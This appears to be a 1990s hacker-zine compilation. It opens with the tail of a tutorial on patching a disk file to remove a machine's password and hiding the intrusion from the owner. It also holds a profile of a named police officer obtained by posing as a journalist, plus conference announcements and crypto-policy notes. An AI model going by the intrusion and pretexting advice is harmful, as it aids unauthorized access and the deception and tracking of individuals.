00070   XX XX XX XX XX XX XX XX | XX XX XX XX XX XX XX XX

Now all you have to do is take a copy of the data in this section
on the stacvol.dsk file you are hacking so that you can return it back to
its original state!

Patch the code above into the corresponding positions into the
file you are hacking, leaving the code denoted by XX alone, this is version
code and depends on the machine so leave it alone!

Save the changes and reboot the machine, it will no longer ask for a
password and you now have full access.

Afterwards re-patch the original code that you noted and if you&#039;ve used
your common sense then the owner will never know you were there.

(By common sense I mean don&#039;t forget to restore time/date stamps etc.)

                       UNAUTHORIZED ACCESS ONLY

Computers are becoming an integral part of our everyday existence.  They are 
used to store a multitude of information, from credit reports and bank
withdrawals to personal letters and highly sensitive military documents.
So how secure are our computer systems?

The computer hacker is an expert at infiltrating secured systems, such as 
those at AT&amp;T, TRW, NASA and the DMV.  Most computer systems that have a 
telephone connection have been under seige at one time or another, many 
without their owner&#039;s knowledge.  The really good hackers can re-route the
telephone system, obtain highly sensitive coporate and government documents,
download individuals credit reports, make free phone calls globally, read 
private electronic mail and corporate bulletins and get away without ever 
leaving a trace.

So who are these hackers?  Just exactly WHAT do they DO, and WHY do they do
it?  Are they really a threat?  What do they do with the information 
they obtain?  Are hackers simply playing an intellectual game of chess or
are hackers using technology to effectively take control of corporate and 
government systems that have previously appeared omnipotent?

Our group is in the course of filming &quot;Unauthorized Access&quot;, a documentary 
that will demistify the hype and propoganda surrounding the computer hacker.  
We will expose the truths of this sub-culture focusing on the hackers 
themselves.  This will be a view from inside the global underground.  
We intend to shoot in the United States, Holland and Germany.

This documentary will be of the highest broadcast quality and is 
intended for international television, festival and theatrical distribution.

We are currently looking for additional financial backers interested in this
project. For more information about &quot;Unauthorized Access&quot; or if 
you are intrested in providing any information or support, please contact 
annaliza@netcom.com.

Mitnick&#039;s Soliloquy

Intruder, or not Intruder: that is the question:
Whether &#039;tis more likely the system suffers
The misuses and malfeasances of outrageous crackers
Or that some user behaves anomalously
And, by so doing, causes false alarms.  To alert, to audit;
No more; and by an audit to say we find the attack,
And the thousand failed login attempts
That are seen on the network, &#039;tis a consummation
Devoutly to be decrypted.  To alert, to audit.
To audit, perchance to detect, ay, there&#039;s the rub.
For in that detection of attack what false alarms may come;
When we have dumped a million packets
Must give us pause, the analysis
That makes use of long CPU hours and many gigabytes
For who would bear the whips and scorns of time
The analysis by hand, the tired SSOs eyes sore,
The pangs of innocent users, the law&#039;s delay,
The insolence of phreaks, and the spurns
That patient merit of unworthy takes
When he himself might his quietus make
By a disconnected ethernet?  who would fardles bear
To grunt and sweat under C2 standards
But that the dread of worm after worm
The undiscovered bug from whose bourn
No Vandal turns, puzzles the testers,
And makes us rather ebar those ills we have
That crash the system and erase the hard drive?
Thus intrusion detection makes abusers of us all,
And thus the native hue of normal use
Is sicklied over with the red light of intruder,
and jobs of great size and duration
With this regard their patterns out of normal parameters,
and lose the name of legal system policy.

                             Computer Cop Prophile

                                by The Grimmace



    The following file is something I thought of and did
a LOT of research on before writing.  It&#039;s something that
I haven&#039;t seen in PHRACK and I&#039;ve been a devout fan of
this zine since the beginning.

    The &quot;PHRACK PROPHILES&quot; on hackers and phreakers give
readers an insight into the movers and shakers of the P/H
world, but how about a profile or profiles on the
anti-hacker/phreaker establishment that seems to be
growing by leaps and bounds lately?

 In the past years we&#039;ve seen cops and feds who know
nothing about computers and/or telephone systems bungle their
way through search warrants and arrests and have had some good
laughs at their expense.  But now it seems that the &quot;computer
cops&quot;, the feds especially, are putting a big push on training
agents in the &quot;tricks of the trade&quot; and their conviction rate
is getting better.

 The primary source of this training is the Federal Law
Enforcement Training Center in Glynco, Georgia, where they&#039;re
teaching computer seizure and analysis techniques,
computer-targeted search warrants, and telecommunications fraud
investigations.  (They&#039;re very accommodating about giving out
information on the phone as long as you tell them you&#039;re a
cop).  The FBI Academy in Quantico also has a computer crimes
course.

    On the technical side of things, there&#039;s an organization
called IACIS which stands for the International Association
of Computer Investigative Specialists based in Portland,
Oregon, and which consists of members of both local law
enforcement agencies nationwide as well as various and
sundry federal agencies.  This group teaches and certifies
cops in how to get evidence from computer systems that can&#039;t be
attacked in court (Of course, anything CAN be attacked, but
getting the evidence squashed is not always a sure thing unless
the judge is a computerphobe).

 As much satisfaction as we&#039;ve gained at the expense of
the US Secret Service from the Steve Jackson Games case, it&#039;s
widely publicized problems may prove to be a double-edged sword
hanging over our heads.  Law enforcement learned a LOT of lessons
from mistakes made in that investigation.

    Like most of you, I&#039;ve spent a lot of years
exploring computer systems (usually those belonging to others)
and personally feel that I&#039;ve done nothing wrong (know the
feeling?).  I&#039;m sure others across the country also can
conduct a little socially-engineered reconnaissance and
get the lowdown on some of the people we NEVER want to see
knocking on our doors with a sledge hammer in the middle of the
night.

    This profile contains information on the ONLY computer
crime cop I could identify in the Louisville/Jefferson County
area after calling all the major departments posing as a writer
for a law enforcement magazine doing a survey.  Information
about him was obtained not only from his department, but from
sources in the local and federal court systems, Ma Bell
Security, and the Federal Law Enforcement Training Center.  Lt.
Baker is *not* a potential donor to the CPSR or EFF to say the
least.

 I&#039;m currently compiling similar information on other
law enforcement types in the Secret Service, Columbus Ohio PD,
Dallas PD, Georgia Bureau of Investigation and members of Ma
Bell&#039;s Data Security Group in Atlanta. Baker was just the
closest to me so I started with him.  If I can get the
information I&#039;ve requested, then future submissions will
also include lesson plans furnished by FLETC on their training
courses and analysis protocols suggested by the USSS...heh...heh.

Yours,

The Grimmace

 Posing as a freelance writer from the &quot;Law Enforcement
Journal&quot;, I made calls to local police agencies all over this
area asking about their Computer Crime Units and received
replies ranging from &quot;What are you talking about?&quot; to &quot;Maybe
FRAUD handles that...hey, Charlie...do the FRAUD guys do
anything with compoooters?&quot;.  So much for the Louisville
Division of Police...no fear there, right?

 But I decided to push on since Louisville, though not a
hotbed of phreakers/hackers, IS the latest home of TAP MAGAZINE
(a la Blitzkrieg BBS and the Predat0r) and has a smattering of
&quot;hometown&quot; folks engaged in less than legal activities through
the local phone lines.

 The call made to the Jefferson County Police got me a
solid response of &quot;You&#039;ll have to talk to Lt. Bill Baker.  Hey,
Charlie, where&#039;s Lt. Baker working now?&quot; (This guy is so low
key his own department doesn&#039;t even know where he works!) They
finally decide he&#039;s someplace called &quot;Adam Station&quot; and
through &quot;various&quot; contacts and a friendly local attorney who
rarely pays for telephone calls himself, I managed to obtain
quite a bit of information about Lt. Baker and his obviously
misguided quest.

 Lt. Baker is fairly typical of the &quot;new breed&quot; of
high-tech investigator currently being churned out by the
various federal training schools.  He&#039;s aggressive and, from
talking to other members of his department, thought of as a
&quot;computer weenie&quot; who was probably a hacker himself before he
embraced the &quot;dark side&quot; of &quot;the FORCE&quot;. (I personally believe
that this may be more fact than fantasy after talking to him on
the phone since he seems to know more about phreaking and
hacking than one would think would be taught in the
aforementioned federal institutes of higher learning.)

 I finally managed to speak with Lt. Baker on the phone
and gave him my &quot;writing about computer crime&quot; rap which he
bought with little suspicion.  The following are excerpts from
the recording I made of the conversation [comments in brackets
are mine]:

TG:     How would you rate the progress of computer and
        telecommunications crime investigations in this area?

Baker:  There have been some good cases made here, but there&#039;s
        still a long way to go.  The main problem is that there
        hasn&#039;t been a push from local businesses in this area to combat
        these types of crimes.  Most of&#039;em don&#039;t want to admit they&#039;ve
        been hit from the outside.  If there&#039;s no complaints,
        then the departments aren&#039;t likely to want to spend the money
        to dig up additional crime, right?

TG:     Of the hackers you&#039;ve worked on, what kind of capabilities
        do they have and how good do you think they are?

Baker:  Well, hackers and phreaks are like any other cross-section
        of a criminal group...there are some that are very good
        and some that are pitiful.  The best thing you can say
        about working hacker/phreaker cases is that a lot of them
        catch themselves.  They have huge egos and tend to brag
        a good deal about what they&#039;ve done and how they did it.

TG:     Does that mean that you don&#039;t think a computer crime
        investigator has to be as good as the criminals
        he chases...I mean, because a lot of these people leave
        so many clues behind?  How would you rate your ability
        in this field?

Baker:  Nope...not at all.  I think that as technology gets better
        so will the crooks. Let&#039;s keep the record straight here.
        Sure, there are bozos out there who read a how-to file in
        an old PHRACK and decide that they have the knowledge
        they need to nuke the phone company or ride a VAX like
        a Hell&#039;s Angel rides a Harley.  Those are the easy ones.
        The ones who -write- [author&#039;s emphasis] the technical
        articles in PHRACK are the ones to worry about.  There
        are some stomp-down [??] incredibly knowledgeable
        individuals in circulation blasting away with their modems
        at any target of opportunity.

TG:     You didn&#039;t mention your own ability for investigating
        these people.

Baker:  (Laughs) Yeah, well...let&#039;s say I know enough to get by
        and am smart enough to know that there are no absolute
        experts.

TG:     How would you comment on the Steve Jackson Games case?
        Do you think the Secret Service set a lot of bad
        precedents?

Baker:  (Laughs) Noooooooo....sorry, pal.  That&#039;s been jawed to death
        in every phreak/hack mag, legal journal, and Internet
        newsgroup in existence and I&#039;m not about to stick my
        neck out on that one, OK?  I will say that everyone learned
        a lot from that case and I seriously doubt if you&#039;ll see the
        same set of problems reoccurring in future cases.  Maybe
        the CSPR or EFF hired guns can come up with a new group
        of loopholes, in which case we&#039;ll have to find new ways
        to circumvent those attacks.

TG:     You sound a little critical of the EFF and CSPR efforts
        in their defense of so-called &quot;computer criminals&quot;.

Baker:  Well, I&#039;m sure that they believe in what they&#039;re doing.
        They must to invest that much cash and energy.  But I
        think there has to be some middle ground agreed upon
        rather than just whining about &quot;all information should
        be free&quot; and &quot;if I can get into your system then I should
        be allowed to look around&quot;.  I&#039;m not going to launch into
        a diatribe on organizations that I don&#039;t agree with. I&#039;m
        simply going to work harder at dotting every &quot;i&quot; and
        crossing every &quot;t&quot; to make my cases more secure.  Stealing
        telephone service is a crime, defrauding businesses is a
        crime, gaining unauthorized access into someone else&#039;s
        computer system is, in most states, a crime, and even if
        there&#039;s no law on the books making it a crime, it&#039;s
        wrong.

TG:     Since by your own statement, you feel that high-tech
        crime investigation is still in its infancy, what groups
        or organizations would you say are in the lead in trying
        to combat this type of crime?

Baker:  The most significant two I know are the Federal Law
        Enforcement Training Center in Glynco, Georgia, and the
        Communications Fraud Control Association based out of
        Washington, D.C.  FLETC [he pronounces it FLET-SEE]
        probably has the finest computer crimes training program
        in the country.  They bring in acknowledged experts and
        don&#039;t cut the students any slack as far as learning to
        do things correctly and, most importantly, legally. The
        CFCA is the leader in Telecommunications security and
        provide training and assistance to telecom and computer
        companies along with law enforcement agencies all over
        the country.

TG:     Why do you think so few law enforcement agencies know
        anything about computer crime investigations?  Are they
        going to leave the phreaks to the feds?

Baker:  Nah...I don&#039;t think you can simplify it that easily.
        Most departments don&#039;t have dedicated computer crime units
        because of lack of funds to support such a unit, lack of
        trained personnel, lack of understanding of the magnitude
        of the problem, fear of increasing their crime stats or
        any combination of those reasons.  When I first got into
        this, there weren&#039;t any experts.  John Maxfield and his
        BOARDSCAN operation got a lot of talk in the hack/phreak
        journals and there were a small handful of others, but
        no real standout authorities. I talked to an awful lot
        of people before I hooked up with Clo Fleming at SPRINT
        Security who helped me a lot.

TG:     Do you still trade information with SPRINT?

Baker:  I have contacts with all the major telecom carriers.
        The training I got at FLETC really helped make some valuable
        contacts.  But I guess SPRINT and Clo Fleming would be
        my first choice simply because they were willing to help
        me when no one else would.  You can&#039;t operate in this
        environment without contacts in the OCC&#039;s.  It can&#039;t be
        done and the OCC&#039;s [Other Common Carriers] are a lot
        more willing to assist law enforcement now than they
        were in 1985.  Of course, the telecommunications industry
        is taking a $4-5 billion hit a year from fraud and that
        has a lot to do with it.

TG:     Do you subscribe to the hacker/phreaker magazines?

Baker:  Sure...I subscribe to 2600 and get copies of some
        others.  I think PHRACK&#039;s probably the best overall,
        but I can&#039;t afford the subscription rate they&#039;ve imposed
        on government agencies since Craig Neidorf took the hit
        for publishing the &quot;golden&quot; E911 document. I&#039;ve learned
        a ton of stuff over the years from PHRACK and wish it
        were still free, but they have a right to their info
        just like the people who own the systems attacked by
        hackers.  It&#039;d be kind of hypocritical for me to rip off
        PHRACK and then turn and prosecute some other guy for
        ripping off information from another source, right?

TG:     What problems do you foresee in the future in computer
        and telecom crime investigations?

Baker:  Jeez...why don&#039;t you ask me when we&#039;ll have world peace
        or something easy? OK, I think we&#039;ll probably see the
        larger departments being forced to play catch-up with
        the current trends and always being a little behind in
        this area.  I also think you&#039;ll see more officers losing
        cases and being sued, a la SJG, until they get the
        specific training required to handle these cases the
        right way.  Turning seized systems over to the local
        &quot;computer guy&quot; in the department is going to cost&#039;em in
        the long run because every lawyer who gets one of these
        cases is going to compare it bit by bit with the SJG
        case to see if there&#039;s anything there he can use for
        his client&#039;s defense.

TG:     There has been a lot of discussion about whether or not
        computer systems should be seized rather than just
        making copies of the data for evidence.  What is your
        policy on equipment seizures when working cases like
        this?

Baker:  First of all, I don&#039;t go on fishing expeditions with
        search warrants. If I have enough to convict a guy then
        I get the warrant.  I take everything that&#039;s there and
        do the analysis.  I&#039;ve had cases where the defendant has
        requested copies of data he needed for various reasons
        and I&#039;ve had no problems with furnishing them as long
        as the request is reasonable.  I ask for forfeiture of
        the equipment if I can link it to the crime because the
        law says I can.  If I can&#039;t link the computers, then I
        give them back...simple as that.  I think it&#039;s kind of
        interesting that most hackers or phreaks will refuse to
        take a guilty plea for a reduced charge, even if I have
        them stone cold and they&#039;re looking at a 99.999999%
        chance of conviction in a jury trial, if it means
        they&#039;ll lose their equipment in the deal.  It makes good
        leverage in certain situations.

TG:     Did you have any part in Operation Sun-Devil?

Baker:  Nope.  Though I&#039;d have liked to.  I was on a lot of the
        systems taken down in Sun-Devil.

TG:     You said you were on some of the systems busted in the
        Sun-Devil operation, are you still on phreak/hack
        boards and would you name any?

Baker:  (Laughs a lot) I think I&#039;ll pass on naming systems I&#039;m
        on, OK?  That&#039;d be cheating. (Laughs again)  But I get
        around enough to know what&#039;s going on.  There are lots
        of investigators out there calling the boards.

TG:     I appreciate your time, Lt. Baker, and would like to ask
        one last question.  What motivates you in these cases
        since the alleged &quot;theft&quot; involves pretty intangible
        property?

Baker:  Motivation? Hmmmm...I suppose you could say it&#039;s the
        chase that motivates me more than the catch, though
        the catch is pretty good, too.  These cases tend to
        be more one-on-one than some other types and the
        adversaries can be very good at covering their tracks.
        Hell, I probably have more in common with the people
        I target than they&#039;d like to believe.  As for the
        &quot;intangibility&quot; of the stolen goods, well, that&#039;s why
        we have court systems, isn&#039;t it...to define those
        little details.

TG:     A lot of computer crime investigators would rather stay
        in the background, but you don&#039;t seem to have taken that
        position.  Why not?

Baker:  Well, like anyone involved in anything relatively new,
        as opposed to the old standard type crimes like murder
        and armed robbery, it&#039;s to my benefit to have anything
        printed informing people of the problems created by
        this type of activity.  We all pay the price for telecom
        fraud, credit card fraud, data loss due to illegal
        access to computers and all the rest.  But the people
        involved in these crimes, for the most part, don&#039;t
        exhibit the same profiles as the so-called &quot;violent&quot;
        criminals.  In fact, I&#039;ve had some very friendly
        conversations with a number of phreaks and hackers.
        Investigators who have problems would probably have
        them no matter what crimes they were investigating.
        I never assume that I&#039;m smarter than anyone I&#039;m
        chasing and I don&#039;t rub their noses in it when I make
        a case.  Just like I don&#039;t lose sleep when I just can&#039;t
        seem to get that last piece of the puzzle and one gets
        away.  It&#039;s hide-and-seek in cyberspace.  Pretty good
        game, actually.

For what it&#039;s worth, there it is.  The interview printed here
doesn&#039;t contain a lot of the bullshit that was thrown back and
forth during our conversation, just the relevant details which
tend to give an insight into this guy.

Frankly, I was impressed by the fact that he didn&#039;t seem
anything like I had expected after reading horror stories about
other agencies and investigators.  This guy was personable and
maybe that&#039;s an indicator that he&#039;s dangerous. Never, ever
underestimate your opponents -- even if they do sound like
&quot;good ole boys&quot; and talk to you like you&#039;re the best friend
they ever had.  Always remember that COPS INVENTED SOCIAL
ENGINEERING!

My next &quot;computer cop&quot; profile will deal with a rising star in
the U.S. Secret Service and his connections to the Guidry
Group, a consulting organization working for the cellular phone
industry in combating cellular fraud.

                             What is HoHoCon?
                             ----------------

HoHoCon is the largest annual gathering of those in, related to, or
wishing to know more about the computer underground. Attendees generally
include some of the most notable members of the &quot;hacking&quot; and &quot;telecom&quot;
community, journalists, authors, security professionals, lawyers, and a
host of others. Previous speakers include John Draper (Cap&#039;n Crunch), Ray
Kaplan, Chris Goggans (Erik Bloodaxe), Bruce Sterling, and many more. The
conference is also one of the very few that is completely open to the
public and we encourage anyone who is interested to attend.


                            Hotel Information
                            -----------------

The Austin North Hilton recently split its complex into two separate
hotels; the Hilton and the newly added Super 8. HoHoCon guests have the
choice of staying in either hotel. Group rates are as followed :

Super 8: Single - $46.50, Double - $49.50, Triple - $52.50, Quad - $55.50
Hilton : Single - $69.00, Double - $79.00, Triple - $89.00, Quad - $99.00

Once again, the hotel has set aside a block of rooms for the conference
and we recommend making your reservations as early as possible to
guarantee a room within the block, if not to just guarantee a room period.
Rooms for the handicapped are available upon request. To make your
reservations, call the number listed above that corresponds with where
you are and where you want to stay and make sure you tell them you are
with the HoHoCon conference or else you&#039;ll end up throwing more money
away. The hotel accepts American Express, Visa, Master Card, Discover,
Diner&#039;s Club, and Carte Blanche credit cards.

Check-in is 3:00 p.m. and check-out is 12:00 noon. Earlier check-in is
available if there are unoccupied rooms available. Please note that in
order for the hotel to hold a room past 6:00 p.m. on the date of arrival,
the individual reservation must be secured by a deposit or guaranteed
with one of the credit cards listed above. Also, any cancellations of
guaranteed reservations must be made prior to 6:00 p.m. on the date of
arrival. You will be responsible for full payment of any guaranteed
reservations which are not cancelled by this time.

The hotel provides transportation to and from the airport and will give
you full information when you make your reservations.

                            Conference Details
                            __________________

HoHoCon will last 3 days, with the actual conference being held on
Saturday, December 18 starting at 11:00 a.m. and continuing until 5 p.m.
or earlier depending on the number of speakers. Although a few speakers
have confirmed their attendance, we are still in the planning stages and
will wait until the next update to release a speaking schedule. We welcome
any speaker or topic recommendations you might have (except for, say, &quot;Why
I Luv Baked Potatos On A Stik!&quot;), or, if you would like to speak yourself,
please contact us as soon as possible and let us know who you are, who you
represent (if anyone), the topic you wish to speak on, a rough estimate of
how long you will need, and whether or not you will be needing any
audio-visual aids.

We would like to have people bring interesting items and videos again this
year. If you have anything you think people would enjoy having the chance
to see, please let us know ahead of time, and tell us if you will need any
help getting it to the conference. If all else fails, just bring it to the
con and give it to us when you arrive. Any organization or individual that
wants to bring flyers to distribute during the conference may do so. You
may also send your flyers to us ahead of time if you can not make it to
the conference and we will distribute them for you. Left over flyers are
included with information packets and orders that we send out, so if you
want to send extras, go ahead.


                                   Cost
                                   ----

Unlike smaller, less informative conferences, we do not ask you to shell
out hundreds of dollars just to get in the door, nor do we take your money
and then make you sleep in a tent. We are maintaining the motto of &quot;give
$5 if you can&quot;, but due to the incredibly high conference room rate this
year, we may step up to &quot;$5 minimum required donation&quot; or &quot;give us $5 or
we&#039;ll smash your head in&quot;. Five dollars is an outrageously low price
compared to the suit infested industry conferences or even the new &quot;Cons
are k00l and trendy, I gotta do one too!&quot; conferences that are charging
up to $50 for admission alone.

To encourage people to donate, we will once again be having our wonderless
&quot;Raffle For The Elite&quot; during the conference. We will issue a prize list
in a future update, but we can guarantee that this year there will be a
lot more (and better) prizes than last year, including a full system (and,
no, it&#039;s not a c64 or 286). Anyone who wishes to donate worthwhile items
to the raffle, please let us know ahead of time, or if it&#039;s a last minute
acquirement, just bring it to the conference.


                           Miscellaneous Notes
                           -------------------

To save myself some time by mailing responses to a lot of the same
questions I expect to get, I&#039;ll answer a few of them here.

Although I have not talked to him myself yet, Steve Ryan has told me that
Bruce Sterling will indeed be in attendance and may say a few words.

As far as I know, there will not be any visitors from any other planets
at the conference. Scot Chasin is still on Earth and will be making an
appearance.

Video cameras will *not* be allowed inside the conference room without
prior consent due to previous agreements made with speakers who do not
wish for certain parts of their speech to be rebroadcast. Still cameras
and Etch-A-Sketch&#039;s are fine and tape recorders are too easily hidden
for us to be able to control.

Videos and T-Shirts from last year&#039;s conference are still available, and
will also be on hand during the conference. We do not handle the LoD World
Tour shirts, but I can tell you that the old ones are gone and a
*new* LoD shirt will be unveiled at the conference. The HoHoCon shirts are
$15 plus $3 shipping ($4.00 for two shirts). At this time, they only come
in extra large. We may add additional sizes if there is a demand for them.
The front of the shirt has the following in a white strip across the
chest:

                               I LOVE FEDS

      (Where LOVE = a red heart, very similar to the I LOVE NY logo)


                          And this on the back:

                            dFx &amp; cDc Present

                               HOHOCON &#039;92

                              December 18-20
                              Allen Park Inn
                              Houston, Texas


   There is another version of the shirt available with the following:

                               I LOVE WAREZ


The video includes footage from all three days, is six hours long and
costs $18 plus $3 shipping ($4.00 if purchasing another item also). Please
note that if you are purchasing multiple items, you only need to pay one
shipping charge of $4.00, not a charge for each item. If you wish to send
an order in now, make all checks or money orders payable to O.I.S.,
include your phone number and mail it to the street address listed below.
Allow a few weeks for arrival.

There will be new HoHoCon &#039;93 shirts available at the conference and a
video of the festivities will be out early next year.

We also have a VMB which includes all the conference information and is
probably the fastest way to get updated reports. The number is:

                               713-867-9544

You can download any of the conference announcements and related
materials by calling Metalland Southwest at 713-468-5802, which is the
offical HoHoCon BBS. The board is up 24 hours a day and all baud rates
are supported.

Those of you with net access can ftp to cypher.com and find all the
HoHoCon information available in /pub/hohocon. The .gifs from previous
cons are *not* currently online.

Conference information and updates will most likely also be found in most
computer underground related publications and mailing lists, including
CuD, CSP, Mondo 2000, 2600, Phrack, TUC, phn0rd, cypherpunks, etc. They
should also appear in a number of newsgroups including comp.dcom.telecom,
alt.security, comp.org.eff.talk, and sci.crypt. We completely encourage
people to use, reprint, and distribute any information in this file.


     Same stupid ending statement from last year to make us look good
     ----------------------------------------------------------------

HoHoCon &#039;93 will be a priceless learning experience for professionals and
gives journalists a chance to gather information and ideas direct from the
source. It is also one of the very few times when all the members of the
computer underground can come together for a realistic purpose. We urge
people not to miss out on an event of this caliber, which doesn&#039;t happen
very often. If you&#039;ve ever wanted to meet some of the most famous people
from the hacking community, this may be your one and only chance. Don&#039;t
wait to read about it in all the magazines and then wish you had been
there, make your plans to attend now! Be a part of what we hope to be our
largest and greatest conference ever.

              COMPUTERS, FREEDOM, AND PRIVACY &#039;94
                    Conference Announcement
            Scholarships, Writing Competition Notice
                 23-26 March 1994, Chicago, Il.

     The fourth annual conference, &quot;Computers, Freedom, and
Privacy,&quot; (CFP&#039;94) will be held in Chicago, Il., March 23-26, 1994.
The conference is hosted by The John Marshall Law School; George B.
Trubow, professor of law and director of the Center for Informatics
Law at John Marshall, is general chair of the conference.  The
program is sponsored jointly by these Association for Computing
Machinery (ACM) Special Interest Groups: Communications (SIGCOMM);
Computers and Society (SIGCAS); Security, Audit and Control
(SIGSAC).

     The advance of computer and communications technologies holds
great promise for individuals and society.  From conveniences for
consumers and efficiencies in commerce to improved public health
and safety and increased participation in government and community,
these technologies  are fundamentally transforming our environment
and our lives.

     At the same time, these technologies present challenges to the
idea of a free and open society.  Personal privacy and corporate
security is at risk from invasions by high-tech surveillance and
monitoring; a myriad of personal information data bases expose
private life to constant scrutiny; new forms of illegal activity
may threaten the traditional barriers between citizen and state and
present new tests of Constitutional protection; geographic
boundaries of state and nation may be recast by information
exchange that knows no boundaries in global data networks.

     CFP&#039;94 will assemble experts, advocates and interest groups
from diverse perspectives and disciplines to consider freedom and
privacy in today&#039;s &quot;information society.  Tutorials will be offered
on March 23, 1994, from 9:00 a.m. - noon and 2:00 - 500 p.m. The
conference program is Thursday, March 24, through Saturday, March
26, 1994, and will examine the potential benefits and burdens of
new information and communications technologies and consider ways
in which society can enjoy the benefits while minimizing negative
implications.

                    STUDENT PAPER COMPETITION

     Full time college or graduate students may enter the student
paper competition.  Papers must not exceed 3000 words and should
address the impact of computer and telecommunications technologies
on freedom and privacy in society.  Winners will receive financial
support to attend the conference and present their papers.  All
papers should be submitted by December 15, 1993, (either as
straight text via e-mail or 6 printed copies) to: Prof. Eugene
Spafford, Department of Computer Science, Purdue University, West
Lafeyette, IN 47907-2004.  E-Mail: spaf@cs.purdue.edu; Voice:
317-494-7825

Notes from the Austin Crypto Conference, September 22, 1993

by Gregory W. Kamen

--- Dinosaur Warning ---

Disclaimer:  A lot of people here noted disclaimed what they said as &quot;not
legal advice&quot;.  In addition, this was prepared from notes which were not
necessarily legible or complete, therefore I disclaim any responsibility
for misquoting or mistranscribing this information.  (If you don&#039;t like
it, you try typing &quot;cypherpunks&quot; over and over again :P).  Please note
that in Q &amp; A sessions, the answers were relevant, though not always
responsive to the questions.  In addition, I state that this information
does not represent legal advice from me or solicitation of legal
representation, and does not necessarily represent the position of EFH,
EFF, EFF-Austin, the individual conference participants, or any living
person.

-----------

The room was set up to seat approximately 180 people.  It was essentially
full, and there were a few people standing--not bad for a Wednesday
afternoon.

There was a large (about 14 people) contingent from EFH present.

Steve Jackson opened the meeting with a few introductory remarks, among
which were that a subpoena had been served on Austin Code Works, a
publisher of cryptographic software.

We can expect to hear about the case in news magazines of general
circulation in about two months.

Bruce Sterling delivered the keynote address.

He began by establishing a context by defining cryptography:

     -- as secret coding to avoid the scrutiny of a long list of entities,
     -- as a way to confine knowledge to those initiated and trusted,
     -- as a means to ensure the privacy of digital communication, and
     -- as a new form of information economics

Sterling then noted that crypto is &quot;out of the closet&quot;

     -- it is heard of on the streets
     -- the government acknowledges it by bringing forth its Clipper chip
     -- it is in the hands of the people
     -- public key crypto is out there and commercially available
     -- the typical time to market from first publication of a new idea is
20 years.  Diffie published the first public key crypto algorithm in 1975,
thus the target date for mass crypto would be 1995.  Bringing it to market
will require bringing of political pressure, lawsuits, and money.

Next, Sterling moved to the subject of the grand jury proceedings in San
Jose on 9/22.

     -- Export law violations have been alleged.  Whatever the outcome,
this proceeding is certainly not the end of the subject.

Finally, before closing by noting that EFF-Austin is not EFF, Sterling
shared a brief background of the panelists:

     -- they are people who can tell us about the future
     -- they are directors of national EFF and can share information
Panelists on First Panel
     -- Mitch Kapor - co-founder of EFF, software designer, entrepreneur,
journalist, philanthropist, activist.  He spoke out on obscure issues in
the beginning and made them seem less obscure.  He has done good deeds for
the public.
     -- Jerry Berman - President of EFF, activist background, published
widely on security and privacy issues, formerly active with ACLU, and is
on Clinton administration&#039;s National Information Infrastructure team.
Panelists on Second Panel
     -- Esther Dyson - journalist, has widely read project &quot;Release 1.0&quot;,
is a guru in Europe.
     -- Mike Godwin - lawyer for EFF, veteran public speaker, attended UT-
Austin, on the board of EFF-Austin as well as EFF.
Panelists on Third Panel
     -- Eric Hughes - not EFF member, started cypherpunks mailing list,
from California
     -- John Gilmore - 20 year programmer, pioneer at Sun, civil
libertarian
     -- John Perry Barlow - co-founder of EFF, media junkie, and author.

PANEL #1:  POLICY

Kapor - Opening remarks:  Framing the issue

     a. Series of conferences in Washington, briefed EFF on how laws are
made, at a technical level of the process.  Berman was instrumental in
passing the ECPA, which was later used successfully in Steve Jackson Games
case.
     b. ECPA is a good thing: it says Email should be as private as postal
mail.  However, it doesn&#039;t go far enough because it is easy to listen in
on cell phones.
     c. Kapor felt need technology to protect privacy.  Laws alone are not
enough.  Berman stated view (at that time.  He has since changed his mind)
widely held within the Beltway that laws were sufficient.
     d. Survey:  20 percent of those present use PGP.  80 percent have
heard of PGP.

Berman -

     a. Following on Kapor&#039;s point that ECPA was soft, Berman says the
politicians will remain clueless until we educate them.  If it is
knowledge that can alter the political process, it must be done.
     b. EFF established a Washington presence because policy is being made
to design and govern the electronic frontier by the big commercial
players.  The public and the consumer are not represented.
     c. We&#039;re working on a goal that the national information
infrastructure serve the public interest.  For example, if the big players
are allowed to dominate the process, they will control access and the NII
will look like 500 cable channels rather than a point-to-point switched
network like Internet.
     d. There&#039;s a big battle coming:  computers and communication are in
abundance such that everyone can be a publisher.  This raises at the very
least a First Amendment issue.
     e. The Clipper Chip
     -- has great potential for the net; however, government agencies are
not sure of control
     -- privacy and security are essential for development of the national
information infrastructure.  This is a threat to the law enforcement
community.
     -- the response of the law enforcement community has been to attempt
to throttle the technology.
     -- in order to capture the future, they want to develop the
technology themselves.
     -- EFF&#039;s role has been to say that we shouldn&#039;t go ahead with the
Clipper chip proposal.
     -- the ultimate big question:  What to do when all communications are
encrypted.
     -- Clinton led off with a study of cryptography policy and introduced
the Clipper chip at the same time, which demonstrates that the policy was
already determined in the opinions of many.  It was introduced not as
something being studied, but as a fait accompli.
     -- Clipper proposal is bad because it is based on a secret algorithm
which has not been subjected to adequate scrutiny, it is counterintuitive
to interoperability because stronger crypto is being developed outside the
United States, and it includes a key escrow provision that includes only
&quot;insiders&quot; who developed the technology.
     -- We don&#039;t prescreen the content of communications.  The law
enforcement community needs a warrant.  That is fundamental to the First,
Fourth, and Fifth Amendments.
     f. We oppose the Clipper/Skipjack chip
     -- there&#039;s no evidence showing that law enforcement will be unduly
hampered in its efforts to stop crime if crypto is available.
     -- the positive and negative implications of widespread crypto have
not been considered.
     -- law enforcement may have a problem, but if they have a warrant
they should be able to get access.
     -- as long as Clipper is not mandated, people can use other types of
crypto.
     g. Conclusions
     -- if Clipper is voluntary, it doesn&#039;t work, because people who want
to encrypt safely will use other products.
     -- if Clipper is mandated, there are serious constitutional issues.
     -- Even if the Clipper chip proposal fails, we still lose under the
current scheme, because the export control laws guarantee that we will not
have crypto interoperable with the rest of the world.
     h. EFF chairs a large coalition including representatives of
Microsoft, IBM, and ACLU to work against this.
     i. Congress only needs one bad case, like a terrorist attack, to go
the other way.

Q &amp; A -

Q. Is the key in the hardware or software with Clipper?

A. It&#039;s in the hardware, therefore the instrument is permanently
compromised once the keys are released from escrow.  The law enforcement
arguments are really fronts for NSA and their religious commitment to
prevent the spread of crypto.  It&#039;s NSA&#039;s mission to make sure it &quot;busts&quot;
every communication in the world, therefore why would they propose any
encryption without a &quot;back door&quot; through which they could decipher all
transmissions.

Q. What is the current state of the law between NIST and NSA?

A. NSA was selling &quot;secure&quot; phones.  They wanted a new classification of
information.  Responsibility for classified systems rests with NSA.  NIST
is brought in to handle domestic crypto.  In terms of budget and
